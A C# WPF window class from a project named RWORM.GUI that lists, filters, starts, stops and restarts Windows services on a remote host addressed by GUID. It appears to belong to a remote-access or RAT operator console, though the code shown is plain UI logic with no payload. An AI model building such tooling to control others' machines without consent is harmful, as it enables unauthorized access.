using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class ServiceManagerWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string _guid;
        private List<ServiceItemDto> _allServices = new();

        public class ServiceItemDto
        {
            public string Name { get; set; } = string.Empty;
            public string DisplayName { get; set; } = string.Empty;
            public string Status { get; set; } = string.Empty;
            public uint Pid { get; set; }
        }

        public ServiceManagerWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid = guid;
            Title = $"Service Manager — {hostname}";
            TitleLabel.Text = hostname;

            _server.RegisterServicesHandler(_guid, OnServicesReceived);
            _ = _server.RequestServices(_guid);
            StatusLabel.Text = "Loading services...";
        }

        private void OnServicesReceived(byte[] data)
        {
            try
            {
                var json = Encoding.UTF8.GetString(data);
                var list = JsonSerializer.Deserialize<List<ServiceItemDto>>(json,
                    new JsonSerializerOptions { PropertyNameCaseInsensitive = true }) ?? new List<ServiceItemDto>();

                _allServices = list;
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    ApplyFilter();
                    StatusLabel.Text = $"{_allServices.Count} services found.";
                }));
            }
            catch (Exception ex)
            {
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    StatusLabel.Text = $"Error: {ex.Message}";
                }));
            }
        }

        private void ApplyFilter()
        {
            string q = SearchBox.Text?.Trim().ToLowerInvariant() ?? "";
            if (string.IsNullOrEmpty(q))
            {
                ServicesGrid.ItemsSource = _allServices;
            }
            else
            {
                ServicesGrid.ItemsSource = _allServices.Where(s =>
                    s.Name.ToLowerInvariant().Contains(q) ||
                    s.DisplayName.ToLowerInvariant().Contains(q)).ToList();
            }
        }

        private void SearchBox_TextChanged(object sender, TextChangedEventArgs e) => ApplyFilter();

        private void Refresh_Click(object sender, RoutedEventArgs e)
        {
            StatusLabel.Text = "Refreshing services...";
            _ = _server.RequestServices(_guid);
        }

        private void Start_Click(object sender, RoutedEventArgs e)
        {
            if (ServicesGrid.SelectedItem is ServiceItemDto item)
            {
                StatusLabel.Text = $"Starting {item.Name}...";
                _ = _server.ControlService(_guid, item.Name, "start", res =>
                {
                    _ = _server.RequestServices(_guid);
                });
            }
        }

        private void Stop_Click(object sender, RoutedEventArgs e)
        {
            if (ServicesGrid.SelectedItem is ServiceItemDto item)
            {
                StatusLabel.Text = $"Stopping {item.Name}...";
                _ = _server.ControlService(_guid, item.Name, "stop", res =>
                {
                    _ = _server.RequestServices(_guid);
                });
            }
        }

        private void Restart_Click(object sender, RoutedEventArgs e)
        {
            if (ServicesGrid.SelectedItem is ServiceItemDto item)
            {
                StatusLabel.Text = $"Restarting {item.Name}...";
                _ = _server.ControlService(_guid, item.Name, "restart", res =>
                {
                    _ = _server.RequestServices(_guid);
                });
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            _server.UnregisterServicesHandler(_guid);
            base.OnClosed(e);
        }
    }
}
